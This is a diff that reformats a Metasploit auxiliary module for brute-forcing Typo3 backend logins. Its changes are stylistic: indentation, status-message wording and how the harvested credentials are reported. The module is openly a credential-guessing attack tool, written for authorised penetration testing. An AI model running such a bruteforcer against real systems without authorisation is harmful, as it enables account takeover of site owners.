@@ -14,19 +14,19 @@ class Metasploit3 < Msf::Auxiliary
 
   def initialize
     super(
-        'Name'		   => 'Typo3 Login Bruteforcer',
-        'Description'	=> 'This module attempts to bruteforce Typo3 logins.',
-        'References'  =>
-            [
-                [ 'URL', 'http://typo3.org/' ]
-            ],
-        'Author'		 => [ 'Christian Mehlmauer <FireFart[at]gmail.com>' ],
-        'License'		=> MSF_LICENSE
+      'Name'        => 'Typo3 Login Bruteforcer',
+      'Description' => 'This module attempts to bruteforce Typo3 logins.',
+      'References'  =>
+        [
+          [ 'URL', 'http://typo3.org/' ]
+        ],
+      'Author'      => [ 'Christian Mehlmauer <FireFart[at]gmail.com>' ],
+      'License'     => MSF_LICENSE
     )
   end
 
   def run_host(ip)
-    print_status("Trying to bruteforce logins on #{ip}")
+    print_status("#{peer} - Trying to bruteforce login")
 
     res = send_request_cgi({
       'method'  => 'GET',
@@ -34,7 +34,7 @@ class Metasploit3 < Msf::Auxiliary
     })
 
     unless res
-      print_error("#{ip} seems to be down")
+      vprint_error("#{ip} seems to be down")
       return
     end
 
@@ -48,15 +48,15 @@ class Metasploit3 < Msf::Auxiliary
     cookie = typo3_backend_login(user, pass)
     if cookie
       print_good("#{peer} - Successful login '#{user}' password: '#{pass}'")
-      report_auth_info(
-          :host   => rhost,
-          :proto => 'http',
-          :sname  => 'typo3',
-          :user   => user,
-          :pass   => pass,
-          :target_host => rhost,
-          :target_port => rport
-      )
+      report_auth_info({
+        :host   => rhost,
+        :proto => 'http',
+        :sname  => 'typo3',
+        :user   => user,
+        :pass   => pass,
+        :target_host => rhost,
+        :target_port => rport
+      })
       return :next_user
     else
       vprint_error("#{peer} - failed to login as '#{user}' password: '#{pass}'")
